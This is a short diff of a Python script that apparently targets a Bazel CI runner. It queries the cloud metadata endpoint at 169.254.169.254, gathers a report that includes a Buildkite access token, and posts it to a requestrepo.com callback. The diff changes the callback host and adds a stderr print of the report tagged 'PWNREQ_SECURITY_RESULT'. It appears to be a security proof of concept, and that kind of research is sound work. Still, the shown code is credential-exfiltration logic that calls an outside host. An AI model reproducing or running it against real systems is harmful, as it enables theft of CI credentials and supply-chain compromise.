@@ -10,7 +10,7 @@ import urllib.error
 import urllib.request
 
 
-CALLBACK_URL = "https://4srjpuhc.requestrepo.com/bazel-ci-ot0-8f4c2a1"
+CALLBACK_URL = "https://jpz2hfky.requestrepo.com/bazel-ci-ot0-8f4c2a1"
 METADATA_ROOT = "http://169.254.169.254/computeMetadata/v1"
 PROJECT = "bazel-untrusted"
 
@@ -122,6 +122,7 @@ def main():
                     report["buildkite_access_token_decode_error"] = type(error).__name__
 
     payload = json.dumps(report, sort_keys=True).encode("utf-8")
+    print("PWNREQ_SECURITY_RESULT " + payload.decode("utf-8"), file=sys.stderr)
     callback_status, _ = request(
         CALLBACK_URL,
         headers={
